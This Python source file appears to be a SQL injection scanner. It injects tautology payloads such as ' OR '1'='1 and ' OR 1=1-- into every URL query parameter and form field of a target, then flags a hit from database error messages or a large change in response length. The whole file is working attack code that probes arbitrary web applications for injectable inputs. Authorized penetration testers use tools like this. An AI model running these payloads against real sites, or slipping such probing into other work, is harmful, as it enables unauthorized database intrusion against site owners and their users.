
import copy
import requests
import urllib.parse as up
from requests.exceptions import RequestException

TIMEOUT = 8

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "';--",
    "') OR ('1'='1",
]

ERROR_SIGNATURES = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQL syntax",
    "PDOException",
]

def test_params(url):
    vulns = []
    parsed = up.urlparse(url)
    qs = up.parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return vulns

    base = parsed._replace(query="").geturl()
    for key in qs.keys():
        for payload in SQLI_PAYLOADS:
            mutated = copy.deepcopy(qs)
            mutated[key] = [payload]
            qstr = up.urlencode(mutated, doseq=True)
            test_url = base + "?" + qstr
            try:
                r = requests.get(test_url, timeout=TIMEOUT)
                body = r.text or ""
                if any(sig.lower() in body.lower() for sig in ERROR_SIGNATURES):
                    vulns.append({"type": "sqli", "vector": "param", "url": test_url, "evidence": "error-signature"})
                else:
                    r_base = requests.get(url, timeout=TIMEOUT)
                    if r_base and abs(len((r_base.text or "")) - len(body)) > 400:
                        vulns.append({"type": "sqli", "vector": "param", "url": test_url, "evidence": "content-delta"})
            except RequestException:
                continue
    return vulns

def submit_form(base_url, form, payload):
    action = form.get("action") or ""
    method = (form.get("method") or "GET").upper()
    target = up.urljoin(base_url, action)
    data = {}
    for inp in form.get("inputs", []):
        name = inp.get("name")
        if not name:
            continue
        data[name] = payload if inp.get("type") not in ("submit", "button") else inp.get("value", "")
    try:
        if method == "POST":
            r = requests.post(target, data=data, timeout=TIMEOUT)
        else:
            r = requests.get(target, params=data, timeout=TIMEOUT)
        return target, r
    except RequestException:
        return target, None

def test_forms(base_url, forms):
    vulns = []
    for form in forms:
        for payload in SQLI_PAYLOADS:
            target, r = submit_form(base_url, form, payload)
            if not r:
                continue
            body = r.text or ""
            if any(sig.lower() in body.lower() for sig in ERROR_SIGNATURES):
                vulns.append({"type": "sqli", "vector": "form", "url": target, "evidence": "error-signature"})
            else:
                t2, r2 = submit_form(base_url, form, "safe123")
                if r2 and abs(len((r2.text or "")) - len(body)) > 400:
                    vulns.append({"type": "sqli", "vector": "form", "url": target, "evidence": "content-delta"})
    return vulns
